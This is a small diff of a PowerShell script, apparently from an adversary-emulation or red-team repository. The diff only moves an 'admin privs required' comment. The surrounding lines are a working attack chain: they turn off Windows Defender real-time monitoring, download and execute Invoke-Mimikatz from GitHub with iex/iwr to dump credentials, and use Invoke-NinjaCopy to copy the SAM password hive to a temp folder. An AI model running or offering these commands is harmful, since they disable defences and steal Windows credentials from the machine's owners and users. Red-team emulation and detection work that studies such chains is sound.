@@ -1,10 +1,9 @@
 Set-MPPreference -DisableRealtimeMonitoring $true
 
-# admin privs required
+############# admin privs required
 iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1 -usebasicparsing)
 Invoke-Mimikatz
 
-############# admin privs required
 iex( iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1 -usebasicparsing)
 Invoke-NinjaCopy -path C:\Windows\System32\config\SAM -LocalDestination $env:Temp\sam
 
